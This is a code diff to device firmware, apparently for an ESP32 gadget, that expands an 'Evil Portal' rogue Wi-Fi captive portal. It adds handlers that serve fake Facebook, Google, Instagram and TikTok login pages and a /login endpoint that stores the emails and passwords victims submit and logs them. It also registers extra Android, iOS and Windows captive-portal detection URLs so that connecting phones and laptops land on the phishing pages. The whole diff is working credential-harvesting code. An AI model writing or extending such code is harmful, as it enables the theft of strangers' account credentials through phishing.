@@ -10,6 +10,7 @@
 
 #include "globals.h"
 #include "ui_components.h"
+#include "EvilPortalHTML.h"
 #include <WiFi.h>
 #include <WebServer.h>
 #include <DNSServer.h>
@@ -88,16 +89,30 @@ static WebServer* dhEpServer = nullptr;
 static DNSServer* dhEpDns = nullptr;
 
 // ═══════════════════════════════════════════════════════════
-// HANDLERS
+// HANDLERS — Multi-platform portal (from EvilPortalHTML.h)
 // ═══════════════════════════════════════════════════════════
 
-static void dhEpHandleRoot() {
-  dhEpServer->send(200, "text/html", DH_PORTAL_HTML);
+static String dhEpCurrentSSID = "CompanionOS-Free";
+
+static String dhEpInjectSSID(const char* html) {
+  String page = String(html);
+  page.replace("__SSID__", dhEpCurrentSSID);
+  return page;
 }
 
-static void dhEpHandleCapture() {
+static void dhEpHandleRoot() {
+  dhEpServer->send(200, "text/html", dhEpInjectSSID(html_selector));
+}
+
+static void dhEpHandleFB() { dhEpServer->send(200, "text/html", String(html_facebook)); }
+static void dhEpHandleGG() { dhEpServer->send(200, "text/html", String(html_google)); }
+static void dhEpHandleIG() { dhEpServer->send(200, "text/html", String(html_instagram)); }
+static void dhEpHandleTT() { dhEpServer->send(200, "text/html", String(html_tiktok)); }
+
+static void dhEpHandleLogin() {
   String email = dhEpServer->arg("email");
   String pass = dhEpServer->arg("password");
+  String platform = dhEpServer->arg("platform");
 
   if (dhEpCredCount < DH_EP_MAX_CREDS) {
     dhEpCreds[dhEpCredCount].email = email;
@@ -105,8 +120,14 @@ static void dhEpHandleCapture() {
     dhEpCredCount++;
   }
 
-  Serial.printf("[EvilPortal] Captured: %s / %s\n", email.c_str(), pass.c_str());
-  dhEpServer->send(200, "text/html", DH_PORTAL_DONE);
+  Serial.printf("[EvilPortal] [%s] Captured: %s / %s\n",
+                platform.c_str(), email.c_str(), pass.c_str());
+  dhEpServer->send(200, "text/html", String(html_success));
+}
+
+// Legacy /capture endpoint (alias for /login)
+static void dhEpHandleCapture() {
+  dhEpHandleLogin();
 }
 
 static void dhEpHandleNotFound() {
@@ -205,10 +226,17 @@ static void dhRunEvilPortal() {
   // Web server
   dhEpServer = new WebServer(80);
   dhEpServer->on("/", HTTP_GET, dhEpHandleRoot);
-  dhEpServer->on("/capture", HTTP_POST, dhEpHandleCapture);
-  dhEpServer->on("/generate_204", HTTP_GET, dhEpHandleRoot);   // Android captive check
-  dhEpServer->on("/hotspot-detect.html", HTTP_GET, dhEpHandleRoot); // iOS captive check
-  dhEpServer->on("/connecttest.txt", HTTP_GET, dhEpHandleRoot); // Windows captive check
+  dhEpServer->on("/fb", HTTP_GET, dhEpHandleFB);
+  dhEpServer->on("/gg", HTTP_GET, dhEpHandleGG);
+  dhEpServer->on("/ig", HTTP_GET, dhEpHandleIG);
+  dhEpServer->on("/tt", HTTP_GET, dhEpHandleTT);
+  dhEpServer->on("/login", HTTP_POST, dhEpHandleLogin);
+  dhEpServer->on("/capture", HTTP_POST, dhEpHandleCapture);  // Legacy alias
+  dhEpServer->on("/generate_204", HTTP_GET, dhEpHandleRoot);   // Android CNA
+  dhEpServer->on("/hotspot-detect.html", HTTP_GET, dhEpHandleRoot); // iOS CNA
+  dhEpServer->on("/connecttest.txt", HTTP_GET, dhEpHandleRoot); // Windows CNA
+  dhEpServer->on("/ncsi.txt", HTTP_GET, dhEpHandleRoot);       // Windows NCSI
+  dhEpServer->on("/redirect", HTTP_GET, dhEpHandleRoot);       // Generic CNA
   dhEpServer->onNotFound(dhEpHandleNotFound);
   dhEpServer->begin();
   dhEpRunning = true;
